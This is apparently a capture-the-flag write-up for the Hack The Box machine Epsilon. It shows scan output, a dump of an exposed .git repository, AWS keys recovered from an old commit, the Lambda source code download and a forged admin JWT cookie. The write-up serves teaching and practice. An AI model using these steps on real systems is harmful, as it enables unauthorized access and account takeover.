## Rustscan
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: 403 Forbidden
| http-git:
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title: Costume Shop
| http-methods:
|_  Supported Methods: GET POST HEAD OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
* * *
## Port 22
Nothing to do without proper username:password. 
We will come back later when we have something...

* * *
## Port 80
From Rustscan results we see that http website is pointing towards git, escpeccialy the .git folder.
![50a509468f827ab0fc9c6b13e6cd1f53.png](../../_resources/50a509468f827ab0fc9c6b13e6cd1f53.png)

From the picture we know that we have a .git folder in the following URL: http://epsilon.htb/.git
so let's try to dump it

┌──(aleksandar㉿DESKTOP-1KSM320)-[~/Epsilon]
└─$ wget -r http://epsilon.htb/.git/
--2022-12-28 14:30:50--  http://epsilon.htb/.git/
Resolving epsilon.htb (epsilon.htb)... 10.10.11.134
Connecting to epsilon.htb (epsilon.htb)|10.10.11.134|:80... connected.
HTTP request sent, awaiting response... 403 Forbidden
2022-12-28 14:30:50 ERROR 403: Forbidden.

But nothing here...
We can try this: https://github.com/arthaud/git-dumper
![f3740c57ac5ae13f9ed16539cdd165aa.png](../../_resources/f3740c57ac5ae13f9ed16539cdd165aa.png)

And we have some extra stuff, we know from source code that AWS Lambda is called and we have a JS Flask(usefull for SSTI later)

* * *
## Port 5000
Surfing to the root page at port 5000 we are presented to a login page, but we can't login
Dirsearch is crashing, probaly cause some throttling but we have app source code from git repo dump. 

![1805c765c0b3e652fd2532b866d373d6.png](../../_resources/1805c765c0b3e652fd2532b866d373d6.png)
From the picture we know that there is a track.html page so we can visit it and seems like here we should do some sort of injection/ssti in order to get our first revshell.
![37d75252ddce42a17931299df45e03cd.png](../../_resources/37d75252ddce42a17931299df45e03cd.png)

* * *
## Lambda
From souce code analysis we know for sure that AWS Lambda microservices are pointing to 
![9b1e58ab29196d08c4b213d1a590e072.png](../../_resources/9b1e58ab29196d08c4b213d1a590e072.png)

cloud.epsilon.htb

Checking the third git commit we se that they saved AWS Keys so we can login with awscli
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# git show c51441640fd25e9fba42725147595b5918eba0f1
commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index fed7ab9..545f6fe 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,8 +5,8 @@ from boto3.session import Session


 session = Session(
-    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
-    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    aws_access_key_id='<aws_access_key_id>',
+    aws_secret_access_key='<aws_secret_access_key>',
     region_name='us-east-1',
     endpoint_url='http://cloud.epsilong.htb')
 aws_lambda = session.client('lambda')


Checking functions
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# aws lambda list-functions --endpoint-url http://cloud.epsilon.htb/
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2022-12-28T13:10:16.641+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "7239e5c1-42ed-48db-9d4c-227d67f5f2b8",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}


Let's try to get the Source code of the app
└─# aws lambda get-function --function-name costume_shop_v1 --endpoint-url http://cloud.epsilon.htb/
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2022-12-28T13:10:16.641+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "7239e5c1-42ed-48db-9d4c-227d67f5f2b8",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}

Downloading the code

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# aws lambda get-function --function-name "costume_shop_v1" --query 'Code.Location' --endpoint-url http://cloud.epsilon.htb/
"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# wget "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
--2022-12-28 15:26:51--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolving cloud.epsilon.htb (cloud.epsilon.htb)... 10.10.11.134
Connecting to cloud.epsilon.htb (cloud.epsilon.htb)|10.10.11.134|:80... connected.
HTTP request sent, awaiting response... 200
Length: 478 [application/zip]
Saving to: ‘code’

code                                                                100%[=================================================================================================================================================================>]     478  --.-KB/s    in 0s

2022-12-28 15:26:51 (53.0 MB/s) - ‘code’ saved [478/478]


Converting it to a zip 
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# file code
code: Zip archive data, at least v2.0 to extract, compression method=deflate

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# mv code code.zip

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# ll
total 16
-rw-r--r-- 1 root root  478 Dec 28 15:26 code.zip
drwxr-xr-x 4 root root 4096 Dec 28 14:43 reports
-rw-r--r-- 1 root root 1670 Dec 28 14:34 server.py
-rw-r--r-- 1 root root 1099 Dec 28 14:34 track_api_CR_148.py

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]
└─# unzip code.zip
Archive:  code.zip
  inflating: lambda_function.py

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Epsilon]

We can analyze the python code
└─# cat lambda_function.py
`import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
			`
		
		
Now we have a secret key.
Checking the server.py source code seems like with that secret key we can forge our jwt cookie in order to login
@app.route("/", methods=["GET","POST"])
def index():
        if request.method=="POST":
                if request.form['username']=="admin" and request.form['password']=="admin":
                        res = make_response()
                        username=request.form['username']
                        token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
                        res.set_cookie("auth",token)
                        res.headers['location']='/home'
                        return res,302
                else:
                        return render_template('index.html')
        else:
		

We can generate our cookie with this Python code
`Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> secret = 'RrXCv`mrNe!K!4+5`wYq'
>>> jwt.encode({"username":"admin"},secret,algorithm="HS256")
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'
>>>`

Now we can add manually to our browser session a cookie named auth with the value shipped with the token generated.
